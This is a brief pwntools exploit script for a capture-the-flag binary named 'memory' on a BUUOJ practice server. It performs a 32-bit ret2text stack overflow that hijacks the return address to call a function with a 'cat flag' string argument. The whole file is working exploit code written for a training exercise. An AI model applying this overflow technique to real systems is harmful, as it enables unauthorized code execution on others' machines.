#Made by fly_autumn
#x86 ret2text
from pwn import *
#p = process("./memory")
p = remote("node5.buuoj.cn",29786)
elf = ELF("./memory")
context(os="linux",arch="i386")

cat_flag = 0x80487e0
#p.recvuntil(b"> ")
offset = 19 + 4
func_plt = 0x80485bd
main_plt = elf.sym["main"]
#话说你这个函数和我直接调用system有什么区别
payload = b"\x00" * offset + p32(func_plt) + p32(main_plt)+ p32(cat_flag)
p.sendline(payload)

p.interactive()
